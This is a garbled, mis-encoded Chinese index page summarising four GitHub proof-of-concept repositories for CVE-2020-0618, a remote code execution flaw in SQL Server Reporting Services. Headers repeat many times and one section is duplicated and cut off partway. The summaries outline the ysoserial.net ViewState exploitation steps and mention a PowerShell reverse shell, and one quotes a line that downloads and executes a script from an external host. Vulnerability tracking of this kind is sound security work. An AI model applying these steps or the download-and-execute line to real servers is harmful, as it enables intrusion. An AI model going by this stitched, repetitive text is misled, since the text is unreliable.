# CVE-2020-0618

> ğŸ“¦ è¯¥CVEæœ‰ **4** ä¸ªç›¸å…³POCä»“åº“

---

## POC #1

**æ¥æº**: [CVE-2020-0618-N3xtGenH4cker_CVE-2020-0618_DETECTION.md](../2020/CVE-2020-0618-N3xtGenH4cker_CVE-2020-0618_DETECTION.md)

# CVE-2020-0618

> ğŸ“¦ è¯¥CVEæœ‰ **4** ä¸ªç›¸å…³POCä»“åº“

---

## POC #1

**æ¥æº**: [CVE-2020-0618-N3xtGenH4cker_CVE-2020-0618_DETECTION.md](../2020/CVE-2020-0618-N3xtGenH4cker_CVE-2020-0618_DETECTION.md)

# CVE-2020-0618

> ğŸ“¦ è¯¥CVEæœ‰ **4** ä¸ªç›¸å…³POCä»“åº“

---

## POC #1

**æ¥æº**: [CVE-2020-0618-N3xtGenH4cker_CVE-2020-0618_DETECTION.md](../2020/CVE-2020-0618-N3xtGenH4cker_CVE-2020-0618_DETECTION.md)

# CVE-2020-0618

> ğŸ“¦ è¯¥CVEæœ‰ **4** ä¸ªç›¸å…³POCä»“åº“

---

## POC #1

**æ¥æº**: [CVE-2020-0618-N3xtGenH4cker_CVE-2020-0618_DETECTION.md](../2020/CVE-2020-0618-N3xtGenH4cker_CVE-2020-0618_DETECTION.md)

# CVE-2020-0618

> ğŸ“¦ è¯¥CVEæœ‰ **4** ä¸ªç›¸å…³POCä»“åº“

---

## POC #1

**æ¥æº**: [CVE-2020-0618-N3xtGenH4cker_CVE-2020-0618_DETECTION.md](../2020/CVE-2020-0618-N3xtGenH4cker_CVE-2020-0618_DETECTION.md)

# CVE-2020-0618

> ğŸ“¦ è¯¥CVEæœ‰ **4** ä¸ªç›¸å…³POCä»“åº“

---

## POC #1

**æ¥æº**: [CVE-2020-0618-N3xtGenH4cker_CVE-2020-0618_DETECTION.md](../2020/CVE-2020-0618-N3xtGenH4cker_CVE-2020-0618_DETECTION.md)

# CVE-2020-0618

> ğŸ“¦ è¯¥CVEæœ‰ **4** ä¸ªç›¸å…³POCä»“åº“

---

## POC #1

**æ¥æº**: [CVE-2020-0618-N3xtGenH4cker_CVE-2020-0618_DETECTION.md](../2020/CVE-2020-0618-N3xtGenH4cker_CVE-2020-0618_DETECTION.md)

# CVE-2020-0618

> ğŸ“¦ è¯¥CVEæœ‰ **4** ä¸ªç›¸å…³POCä»“åº“

---

## POC #1

**æ¥æº**: [CVE-2020-0618-N3xtGenH4cker_CVE-2020-0618_DETECTION.md](../2020/CVE-2020-0618-N3xtGenH4cker_CVE-2020-0618_DETECTION.md)

# CVE-2020-0618

> ğŸ“¦ è¯¥CVEæœ‰ **4** ä¸ªç›¸å…³POCä»“åº“

---

## POC #1

**æ¥æº**: [CVE-2020-0618-N3xtGenH4cker_CVE-2020-0618_DETECTION.md](../2020/CVE-2020-0618-N3xtGenH4cker_CVE-2020-0618_DETECTION.md)

# CVE-2020-0618

> ğŸ“¦ è¯¥CVEæœ‰ **4** ä¸ªç›¸å…³POCä»“åº“

---

## POC #1

**æ¥æº**: [CVE-2020-0618-N3xtGenH4cker_CVE-2020-0618_DETECTION.md](../2020/CVE-2020-0618-N3xtGenH4cker_CVE-2020-0618_DETECTION.md)

# CVE-2020-0618

> ğŸ“¦ è¯¥CVEæœ‰ **4** ä¸ªç›¸å…³POCä»“åº“

---

## POC #1

**æ¥æº**: [CVE-2020-0618-N3xtGenH4cker_CVE-2020-0618_DETECTION.md](../2020/CVE-2020-0618-N3xtGenH4cker_CVE-2020-0618_DETECTION.md)

# CVE-2020-0618

> ğŸ“¦ è¯¥CVEæœ‰ **4** ä¸ªç›¸å…³POCä»“åº“

---

## POC #1

**æ¥æº**: [CVE-2020-0618-N3xtGenH4cker_CVE-2020-0618_DETECTION.md](../2020/CVE-2020-0618-N3xtGenH4cker_CVE-2020-0618_DETECTION.md)

# CVE-2020-0618

> ğŸ“¦ è¯¥CVEæœ‰ **4** ä¸ªç›¸å…³POCä»“åº“

---

## POC #1

**æ¥æº**: [CVE-2020-0618-N3xtGenH4cker_CVE-2020-0618_DETECTION.md](../2020/CVE-2020-0618-N3xtGenH4cker_CVE-2020-0618_DETECTION.md)

# CVE-2020-0618

> ğŸ“¦ è¯¥CVEæœ‰ **4** ä¸ªç›¸å…³POCä»“åº“

---

## POC #1

**æ¥æº**: [CVE-2020-0618-N3xtGenH4cker_CVE-2020-0618_DETECTION.md](../2020/CVE-2020-0618-N3xtGenH4cker_CVE-2020-0618_DETECTION.md)

# CVE-2020-0618

> ğŸ“¦ è¯¥CVEæœ‰ **4** ä¸ªç›¸å…³POCä»“åº“

---

## POC #1

**æ¥æº**: [CVE-2020-0618-N3xtGenH4cker_CVE-2020-0618_DETECTION.md](../2020/CVE-2020-0618-N3xtGenH4cker_CVE-2020-0618_DETECTION.md)

# CVE-2020-0618

> ğŸ“¦ è¯¥CVEæœ‰ **4** ä¸ªç›¸å…³POCä»“åº“

---

## POC #1

**æ¥æº**: [CVE-2020-0618-N3xtGenH4cker_CVE-2020-0618_DETECTION.md](../2020/CVE-2020-0618-N3xtGenH4cker_CVE-2020-0618_DETECTION.md)

# CVE-2020-0618

> ğŸ“¦ è¯¥CVEæœ‰ **4** ä¸ªç›¸å…³POCä»“åº“

---

## POC #1

**æ¥æº**: [CVE-2020-0618-N3xtGenH4cker_CVE-2020-0618_DETECTION.md](../2020/CVE-2020-0618-N3xtGenH4cker_CVE-2020-0618_DETECTION.md)

## CVE-2020-0618 - Microsoft SQL Server Reporting Services (SSRS) è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´

**æ¼æ´ç¼–å·:** CVE-2020-0618

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Microsoft SQL Server Reporting Services (SSRS)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** å—å½±å“çš„ç‰ˆæœ¬åŒ…æ‹¬ SQL Server 2012 SP4 (QFE), SQL Server 2016 SP2 (CU), SQL Server 2014 SP3 (GDR/CU)

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦èƒ½å¤Ÿè®¿é—®å­˜åœ¨æ¼æ´çš„SSRSæœåŠ¡

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 0%

## è¯¦æƒ…

CVE-2020-0618 æ˜¯ä¸€ä¸ªå­˜åœ¨äº Microsoft SQL Server Reporting Services (SSRS) ä¸­çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚è¯¥æ¼æ´æ˜¯ç”±äº SSRS æœªèƒ½æ­£ç¡®å¤„ç†é¡µé¢è¯·æ±‚å¯¼è‡´çš„ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡å‘é€ç‰¹åˆ¶çš„ SOAP è¯·æ±‚åˆ° ReportServerï¼Œåˆ©ç”¨`LoadReport()` API ä¸­çš„ä¸å½“è·¯å¾„éªŒè¯æ¥è§¦å‘ååºåˆ—åŒ–æ¼æ´ï¼Œæœ€ç»ˆå¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

**æœ‰æ•ˆæ€§ï¼š**
æä¾›çš„ POC ä»£ç æ—¨åœ¨æ£€æµ‹æ¼æ´æ˜¯å¦å­˜åœ¨ï¼Œè€Œéç›´æ¥æ‰§è¡Œä»£ç ã€‚å®ƒé€šè¿‡å‘é€åŒ…å« "../" çš„ `LoadReport` SOAP è¯·æ±‚ï¼Œå¦‚æœæœåŠ¡å™¨è¿”å›åŒ…å« "Execution" çš„å“åº”ï¼Œåˆ™è¡¨æ˜å¯èƒ½å­˜åœ¨æ¼æ´ã€‚æ ¹æ®æœç´¢ç»“æœï¼Œè¯¥æ¼æ´æ˜¯çœŸå®å­˜åœ¨çš„ï¼Œä¸”å­˜åœ¨å…¬å¼€çš„åˆ©ç”¨ä»£ç ï¼Œè¡¨æ˜è¯¥æ£€æµ‹æ–¹æ³•æ˜¯æœ‰æ•ˆçš„ã€‚

**æŠ•æ¯’é£é™©ï¼š**
åˆ†ææä¾›çš„ POC ä»£ç  `cve_2020_0618_poc.py` å’Œ `README.md`ï¼Œè¯¥ä»£ç çš„åŠŸèƒ½è¾ƒä¸ºç®€å•ï¼Œä¸»è¦æ˜¯å‘é€ä¸€ä¸ª SOAP è¯·æ±‚å¹¶åˆ¤æ–­å“åº”ä¸­æ˜¯å¦åŒ…å«ç‰¹å®šå­—ç¬¦ä¸²ã€‚æœªå‘ç°ä»»ä½•éšè—çš„ã€æ¶æ„çš„ä»£ç æˆ–é€»è¾‘ï¼Œå› æ­¤æŠ•æ¯’é£é™©è¾ƒä½ã€‚è¯¥ä»“åº“åªæä¾›æ£€æµ‹ï¼Œæ— åˆ©ç”¨ä»£ç ,å› æ­¤æŠ•æ¯’é£é™©ä¸º 0%ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
æ ¹æ®æœç´¢ç»“æœå’Œæ¼æ´æè¿°ï¼Œè¯¥æ¼æ´çš„åˆ©ç”¨æ–¹å¼å¦‚ä¸‹ï¼š
1.  æ”»å‡»è€…å‘ SSRS ReportServer å‘é€ç‰¹åˆ¶çš„ SOAP è¯·æ±‚ã€‚
2.  è¯¥è¯·æ±‚åˆ©ç”¨ `LoadReport` APIï¼Œå¹¶åŒ…å«æ¶æ„çš„ `Report` å‚æ•°ï¼Œä¾‹å¦‚ "../"ï¼Œè§¦å‘è·¯å¾„éå†ã€‚
3.  SSRS åœ¨å¤„ç†è¯¥è¯·æ±‚æ—¶ï¼Œç”±äºä¸å½“çš„è¾“å…¥éªŒè¯ï¼Œå¯¼è‡´ååºåˆ—åŒ–æ¼æ´ã€‚
4.  æ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„çš„åºåˆ—åŒ–å¯¹è±¡ï¼Œåœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„ä»£ç ã€‚æ­¤ POC åªæ˜¯éªŒè¯æ˜¯å¦å­˜åœ¨æ¼æ´ï¼ŒçœŸæ­£çš„æ”»å‡»éœ€è¦æ„é€ æ¶æ„çš„åºåˆ—åŒ–å¯¹è±¡ã€‚



**é¡¹ç›®åœ°å€:** [N3xtGenH4cker/CVE-2020-0618_DETECTION](https://github.com/N3xtGenH4cker/CVE-2020-0618_DETECTION)

**æ¼æ´è¯¦æƒ…:** [CVE-2020-0618](https://nvd.nist.gov/vuln/detail/CVE-2020-0618)

---

## POC #2

**æ¥æº**: [CVE-2020-0618-euphrat1ca_CVE-2020-0618.md](../2020/CVE-2020-0618-euphrat1ca_CVE-2020-0618.md)

## CVE-2020-0618 - Microsoft SQL Server Reporting Services Remote Code Execution

**æ¼æ´ç¼–å·:** CVE-2020-0618

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Microsoft SQL Server Reporting Services (SSRS)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯å¯¼è‡´å®Œå…¨æ§åˆ¶å—å½±å“çš„æœåŠ¡å™¨

**å½±å“ç‰ˆæœ¬:** å—å½±å“ç‰ˆæœ¬åŒ…æ‹¬SQL Server 2012 SP4 (QFE), SQL Server 2016 SP2 (CU), SQL Server 2014 SP3 (GDR/CU)

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦èƒ½å¤Ÿå‘ReportServer/pages/ReportViewer.aspxå‘é€POSTè¯·æ±‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2020-0618 æ˜¯ Microsoft SQL Server Reporting Services (SSRS) ä¸­çš„ä¸€ä¸ªè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚è¯¥æ¼æ´æºäº SSRS åœ¨å¤„ç†é¡µé¢è¯·æ±‚æ—¶å­˜åœ¨ä¸æ­£ç¡®çš„ååºåˆ—åŒ–æ“ä½œã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„çš„ `ViewState` å‚æ•°ï¼Œå°†å…¶æ’å…¥åˆ°å‘å¾€ `ReportServer/pages/ReportViewer.aspx` çš„ POST è¯·æ±‚ä¸­ï¼Œåˆ©ç”¨ `LosFormatter` ååºåˆ—åŒ–å™¨æ‰§è¡Œä»»æ„ä»£ç ã€‚æä¾›çš„ PoC ä½¿ç”¨ `ysoserial.net` ç”Ÿæˆ Payloadï¼Œè¯¥ Payload ä½¿ç”¨ `TypeConfuseDelegate` gadget chainï¼Œå¹¶é€šè¿‡ PowerShell æ‰§è¡Œåå‘è¿æ¥ shell å‘½ä»¤ã€‚ 

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  ä½¿ç”¨ `ysoserial.net` å·¥å…·ç”Ÿæˆæ¶æ„çš„ `ViewState` Payloadã€‚
2.  å°† Payload æ’å…¥åˆ°å‘å¾€ `ReportServer/pages/ReportViewer.aspx` çš„ POST è¯·æ±‚çš„ `NavigationCorrector$ViewState` å‚æ•°ä¸­ã€‚
3.  å‘é€ç²¾å¿ƒæ„é€ çš„ POST è¯·æ±‚åˆ°ç›®æ ‡æœåŠ¡å™¨ã€‚
4.  å¦‚æœæ¼æ´åˆ©ç”¨æˆåŠŸï¼ŒæœåŠ¡å™¨å°†æ‰§è¡Œ Payload ä¸­åŒ…å«çš„æ¶æ„ä»£ç ã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**

è¯¥ PoC ä»£ç ä¸»è¦åˆ©ç”¨ `ysoserial.net` ç”Ÿæˆ Payloadï¼Œè¯¥ Payload è¾ƒä¸ºå¸¸è§ï¼Œä¸»è¦é£é™©å­˜åœ¨äºæ‰§è¡Œçš„ Powershell è„šæœ¬ã€‚è„šæœ¬å†…å®¹æœ¬èº«æ˜¯ä¸ºäº†å»ºç«‹åå‘ shellï¼Œä½†è‹¥æ”»å‡»è€…ä¿®æ”¹è„šæœ¬ä¸­çš„ IP åœ°å€æˆ–ç«¯å£ï¼Œå¯èƒ½å¯¼è‡´å—å®³è€…è¿æ¥åˆ°æ”»å‡»è€…çš„æœåŠ¡å™¨ï¼Œä»è€Œæ³„éœ²ä¿¡æ¯æˆ–è¢«è¿›ä¸€æ­¥æ§åˆ¶ã€‚ä»“åº“æœ¬èº«ä¹Ÿå¯èƒ½è¢«å…¶ä»–äººç¯¡æ”¹ã€‚ç»¼åˆè€ƒè™‘ï¼ŒæŠ•æ¯’é£é™©çº¦ä¸º 10%ã€‚

**é¡¹ç›®åœ°å€:** [euphrat1ca/CVE-2020-0618](https://github.com/euphrat1ca/CVE-2020-0618)

**æ¼æ´è¯¦æƒ…:** [CVE-2020-0618](https://nvd.nist.gov/vuln/detail/CVE-2020-0618)

---

## POC #3

**æ¥æº**: [CVE-2020-0618-itstarsec_CVE-2020-0618.md](../2020/CVE-2020-0618-itstarsec_CVE-2020-0618.md)

## CVE-2020-0618 - Microsoft SQL Server Reporting Services RCE

**æ¼æ´ç¼–å·:** CVE-2020-0618

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Microsoft SQL Server Reporting Services (SSRS)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´æœåŠ¡å™¨å®Œå…¨æ§åˆ¶

**å½±å“ç‰ˆæœ¬:** å—å½±å“ç‰ˆæœ¬åŒ…æ‹¬SQL Server 2012 SP4, 2014 SP3, 2016 SP2 ç­‰ï¼Œå…·ä½“å‚è€ƒæ¼æ´åº“ä¿¡æ¯

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦èƒ½å¤Ÿè®¿é—®SSRSæœåŠ¡çš„webé¡µé¢

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2020-0618æ˜¯ä¸€ä¸ªå­˜åœ¨äºMicrosoft SQL Server Reporting Servicesä¸­çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚è¯¥æ¼æ´æ˜¯ç”±äºSSRSæœªèƒ½æ­£ç¡®å¤„ç†é¡µé¢è¯·æ±‚å¯¼è‡´çš„ï¼Œæ›´å…·ä½“åœ°è¯´ï¼Œæ˜¯ç”±äº`ViewState`ååºåˆ—åŒ–æ¼æ´ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡å‘é€ç‰¹åˆ¶çš„é¡µé¢è¯·æ±‚ï¼Œåˆ©ç”¨ä¸å®‰å…¨çš„`LosFormatter`ååºåˆ—åŒ–è¿‡ç¨‹æ‰§è¡Œä»»æ„ä»£ç ã€‚

**æœ‰æ•ˆæ€§ï¼š**
æä¾›çš„POCä»£ç çœ‹èµ·æ¥æœ‰æ•ˆã€‚å®ƒä½¿ç”¨äº†`ysoserial.net`å·¥å…·ç”Ÿæˆæ¶æ„çš„åºåˆ—åŒ–payloadï¼Œå¹¶ä½¿ç”¨`TypeConfuseDelegate` gadgetï¼Œè¯¥gadgetå¸¸ç”¨äº.NETååºåˆ—åŒ–æ¼æ´çš„åˆ©ç”¨ã€‚Payloadä¸­åµŒå…¥äº†powershellå‘½ä»¤ï¼Œç”¨äºæ‰§è¡Œä»»æ„ä»£ç ï¼Œä¾‹å¦‚é€šè¿‡`iwr`ä¸‹è½½å¹¶æ‰§è¡Œè¿œç¨‹è„šæœ¬ã€‚

**æŠ•æ¯’é£é™©ï¼š**
è¯¥ä»“åº“å­˜åœ¨ä¸€å®šçš„æŠ•æ¯’é£é™©ã€‚è™½ç„¶ä¸»è¦çš„æ¼æ´åˆ©ç”¨ä»£ç çœ‹èµ·æ¥æ˜¯åˆç†çš„ï¼Œä½†ä»¥ä¸‹å‡ ç‚¹éœ€è¦æ³¨æ„ï¼š
*   POCä»£ç ä¸­çš„`iwr("https://qoigyuef2a4z1a7rsir6lvi3eukl8a.burpcollaborator.net/In")|iex'`ï¼Œè¯¥URLæŒ‡å‘ä¸€ä¸ªå¤–éƒ¨èµ„æºï¼Œå¦‚æœè¯¥èµ„æºè¢«ç¯¡æ”¹ï¼Œåˆ™å¯èƒ½å¯¼è‡´æ‰§è¡Œæ¶æ„ä»£ç ã€‚
*   è™½ç„¶åˆ©ç”¨ä»£ç çœ‹èµ·æ¥åƒæ˜¯åˆæ³•çš„åˆ©ç”¨ï¼Œä½†ä»ç„¶è¦è°¨æ…ï¼Œç”±äº `burpcollaborator.net` åŸŸåæ˜¯ä¸€ç§å¸¸ç”¨çš„æ¸—é€æµ‹è¯•å·¥å…·ï¼Œè™½ç„¶åœ¨æœ¬æ¬¡ä¸Šä¸‹æ–‡ä¸­ä¸ä¸€å®šæ˜¯æ¶æ„çš„ï¼Œä½†ä¹Ÿå¢åŠ äº†æŠ•æ¯’çš„æ¦‚ç‡.
ç»¼åˆè€ƒè™‘ï¼Œè¯„ä¼°æŠ•æ¯’é£é™©ä¸º10%ã€‚ä¸»è¦é£é™©åœ¨äºå¤–éƒ¨URLå’Œæ½œåœ¨çš„payloadã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  æ”»å‡»è€…é¦–å…ˆéœ€è¦ç¡®å®šç›®æ ‡SSRSæœåŠ¡å™¨å­˜åœ¨CVE-2020-0618æ¼æ´ã€‚
2.  ä½¿ç”¨`ysoserial.net`å·¥å…·ï¼ŒåŸºäº`TypeConfuseDelegate` gadgetå’Œ`LosFormatter`æ ¼å¼ï¼Œç”ŸæˆåŒ…å«æ¶æ„powershellå‘½ä»¤çš„åºåˆ—åŒ–payloadã€‚
3.  æ¶æ„powershellå‘½ä»¤ä¼šè¢«ç¼–ç æˆBase64å­—ç¬¦ä¸²ã€‚
4.  æ”»å‡»è€…æ„é€ åŒ…å«è¯¥payloadçš„æ¶æ„è¯·æ±‚ï¼Œå‘é€åˆ°SSRSæœåŠ¡å™¨çš„webé¡µé¢ã€‚æ¼æ´åˆ©ç”¨é“¾å¤§è‡´å¦‚ä¸‹ï¼šç½‘é¡µè¯·æ±‚->ViewState->LosFormatterååºåˆ—åŒ–->TypeConfuseDelegate -> Powershell RCE
5.  SSRSæœåŠ¡å™¨åœ¨å¤„ç†è¯·æ±‚æ—¶ï¼Œä¼šååºåˆ—åŒ–`ViewState`ï¼Œç”±äº`LosFormatter`çš„ä¸å®‰å…¨æ€§ï¼Œä¼šå¯¼è‡´ä»£ç æ‰§è¡Œã€‚`TypeConfuseDelegate` gadgetä¼šå°†ååºåˆ—åŒ–è¿‡ç¨‹å¯¼å‘æ¶æ„ä»£ç ã€‚
6.  æœ€ç»ˆï¼ŒæœåŠ¡å™¨ä¼šæ‰§è¡Œpayloadä¸­åµŒå…¥çš„powershellå‘½ä»¤ï¼Œæ”»å‡»è€…ä»è€Œè·å¾—è¿œç¨‹ä»£ç æ‰§è¡Œçš„èƒ½åŠ›ã€‚

**é¡¹ç›®åœ°å€:** [itstarsec/CVE-2020-0618](https://github.com/itstarsec/CVE-2020-0618)

**æ¼æ´è¯¦æƒ…:** [CVE-2020-0618](https://nvd.nist.gov/vuln/detail/CVE-2020-0618)

---

## POC #4

**æ¥æº**: [CVE-2020-0618-wortell_cve-2020-0618.md](../2020/CVE-2020-0618-wortell_cve-2020-0618.md)

## CVE-2020-0618 Microsoft SQL Server Reporting Services RCE Honeypot

**æ¼æ´ç¼–å·:** CVE-2020-0618

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Microsoft SQL Server Reporting Services (SSRS)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´æœåŠ¡å™¨è¢«å®Œå…¨æ§åˆ¶

**å½±å“ç‰ˆæœ¬:** å—å½±å“ç‰ˆæœ¬åŒ…æ‹¬ä½†ä¸é™äºï¼šMicrosoft SQL Server 2012, 2014, 2016

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦èƒ½å¤Ÿè®¿é—®å­˜åœ¨æ¼æ´çš„SSRSæœåŠ¡ï¼Œé€šå¸¸æ˜¯WebæœåŠ¡ç«¯å£

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 5%

## è¯¦æƒ…

CVE-2020-0618æ˜¯ä¸€ä¸ªMicrosoft SQL Server Reporting Services (SSRS) ä¸­çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ŒæºäºSSRSæœªèƒ½æ­£ç¡®å¤„ç†é¡µé¢è¯·æ±‚ã€‚è¯¥æ¼æ´æ˜¯ç”±äº.NET ViewStateååºåˆ—åŒ–æ—¶æœªè¿›è¡Œå……åˆ†çš„è¾“å…¥éªŒè¯å¯¼è‡´çš„ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤æ¼æ´åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„ä»£ç ã€‚

**æœ‰æ•ˆæ€§è¯„ä¼°ï¼š**
æ ¹æ®æä¾›çš„æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢å¼•æ“ç»“æœï¼Œè¯¥æ¼æ´æ˜¯çœŸå®å­˜åœ¨çš„ï¼Œå¹¶ä¸”æœ‰å…¬å¼€çš„PoCï¼ˆProof of Conceptï¼‰ä»£ç å¯ç”¨ã€‚æä¾›çš„ä»£ç æ˜¯ä¸€ä¸ªèœœç½ï¼Œæ—¨åœ¨æ£€æµ‹åˆ©ç”¨CVE-2020-0618çš„æ”»å‡»å°è¯•ï¼Œè€Œä¸æ˜¯ç›´æ¥åˆ©ç”¨è¯¥æ¼æ´ã€‚èœœç½é€šè¿‡æ¨¡æ‹ŸSSRSæœåŠ¡ï¼Œè®°å½•æ‰€æœ‰è¯·æ±‚ï¼Œç‰¹åˆ«æ˜¯é‚£äº›è¯•å›¾è§¦å‘æ¼æ´çš„è¯·æ±‚ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
åˆ©ç”¨æ–¹å¼é€šå¸¸æ¶‰åŠæ„é€ æ¶æ„çš„.NET ViewStateï¼Œå°†å…¶ä½œä¸ºè¯·æ±‚çš„ä¸€éƒ¨åˆ†å‘é€åˆ°SSRSæœåŠ¡å™¨ã€‚æœåŠ¡å™¨åœ¨ååºåˆ—åŒ–ViewStateæ—¶ï¼Œä¼šæ‰§è¡Œæ”»å‡»è€…é¢„å…ˆè®¾å®šçš„æ¶æ„ä»£ç ï¼Œä»è€Œå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚æ”»å‡»è€…å¯èƒ½éœ€è¦å…ˆæ‰¾åˆ°æœ‰æ•ˆçš„ViewStateï¼Œç„¶åæ›¿æ¢å…¶ä¸­çš„éƒ¨åˆ†å†…å®¹ï¼Œæˆ–è€…ç”Ÿæˆå…¨æ–°çš„æ¶æ„ViewStateã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**
è¯¥ä»£ç åº“ä¸»è¦æ˜¯ä¸€ä¸ªèœœç½ï¼Œå…¶ç›®çš„æ˜¯**æ£€æµ‹**è€Œé**åˆ©ç”¨**æ¼æ´ã€‚ ä»£ç åŒ…å«ç”¨äºæ¨¡æ‹ŸSSRSæœåŠ¡å™¨è¡Œä¸ºçš„éƒ¨åˆ†ï¼Œä»¥åŠç”¨äºè®°å½•è¯·æ±‚å’Œé”™è¯¯çš„æ—¥å¿—è®°å½•åŠŸèƒ½ã€‚ ä½†æ˜¯,ä»ç„¶å­˜åœ¨ä¸€äº›æ½œåœ¨çš„æŠ•æ¯’é£é™©ï¼Œä¾‹å¦‚ï¼š

*   **è™šå‡æ—¥å¿—ï¼š** æ”»å‡»è€…å¯ä»¥ä¿®æ”¹æ—¥å¿—è®°å½•éƒ¨åˆ†ï¼Œä½¿å…¶æŠ¥å‘Šè™šå‡ä¿¡æ¯ï¼Œè¯¯å¯¼å®‰å…¨åˆ†æäººå‘˜ã€‚
*   **èµ„æºæ¶ˆè€—ï¼š** æ”»å‡»è€…å¯èƒ½ä¿®æ”¹ä»£ç ï¼Œä½¿å…¶åœ¨æ¥æ”¶åˆ°ç‰¹å®šç±»å‹çš„è¯·æ±‚æ—¶æ¶ˆè€—å¤§é‡èµ„æºï¼Œå¯¼è‡´æ‹’ç»æœåŠ¡ã€‚

è€ƒè™‘åˆ°ä»£ç åº“çš„èœœç½æ€§è´¨å’Œç°æœ‰åŠŸèƒ½ï¼Œåˆ¤å®šæŠ•æ¯’é£é™©è¾ƒä½ï¼Œä½†ä¸èƒ½å®Œå…¨æ’é™¤ã€‚ é£é™©è¯„ä¼°åœ¨5%ã€‚

**é¡¹ç›®åœ°å€:** [wortell/cve-2020-0618](https://github.com/wortell/cve-2020-0618)

**æ¼æ´è¯¦æƒ…:** [CVE-2020-0618](https://nvd.nist.gov/vuln/detail/CVE-2020-0618)

---



---

## POC #2

**æ¥æº**: [CVE-2020-0618-euphrat1ca_CVE-2020-0618.md](../2020/CVE-2020-0618-euphrat1ca_CVE-2020-0618.md)

## CVE-2020-0618 - Microsoft SQL Server Reporting Services Remote Code Execution

**æ¼æ´ç¼–å·:** CVE-2020-0618

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Microsoft SQL Server Reporting Services (SSRS)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯å¯¼è‡´å®Œå…¨æ§åˆ¶å—å½±å“çš„æœåŠ¡å™¨

**å½±å“ç‰ˆæœ¬:** å—å½±å“ç‰ˆæœ¬åŒ…æ‹¬SQL Server 2012 SP4 (QFE), SQL Server 2016 SP2 (CU), SQL Server 2014 SP3 (GDR/CU)

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦èƒ½å¤Ÿå‘ReportServer/pages/ReportViewer.aspxå‘é€POSTè¯·æ±‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2020-0618 æ˜¯ Microsoft SQL Server Reporting Services (SSRS) ä¸­çš„ä¸€ä¸ªè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚è¯¥æ¼æ´æºäº SSRS åœ¨å¤„ç†é¡µé¢è¯·æ±‚æ—¶å­˜åœ¨ä¸æ­£ç¡®çš„ååºåˆ—åŒ–æ“ä½œã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„çš„ `ViewState` å‚æ•°ï¼Œå°†å…¶æ’å…¥åˆ°å‘å¾€ `ReportServer/pages/ReportViewer.aspx` çš„ POST è¯·æ±‚ä¸­ï¼Œåˆ©ç”¨ `LosFormatter` ååºåˆ—åŒ–å™¨æ‰§è¡Œä»»æ„ä»£ç ã€‚æä¾›çš„ PoC ä½¿ç”¨ `ysoserial.net` ç”Ÿæˆ Payloadï¼Œè¯¥ Payload ä½¿ç”¨ `TypeConfuseDelegate` gadget chainï¼Œå¹¶é€šè¿‡ PowerShell æ‰§è¡Œåå‘è¿æ¥ shell å‘½ä»¤ã€‚ 

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  ä½¿ç”¨ `ysoserial.net` å·¥å…·ç”Ÿæˆæ¶æ„çš„ `ViewState` Payloadã€‚
2.  å°† Payload æ’å…¥åˆ°å‘å¾€ `ReportServer/pages/ReportViewer.aspx` çš„ POST è¯·æ±‚çš„ `NavigationCorrector$ViewState` å‚æ•°ä¸­ã€‚
3.  å‘é€ç²¾å¿ƒæ„é€ çš„ POST è¯·æ±‚åˆ°ç›®æ ‡æœåŠ¡å™¨ã€‚
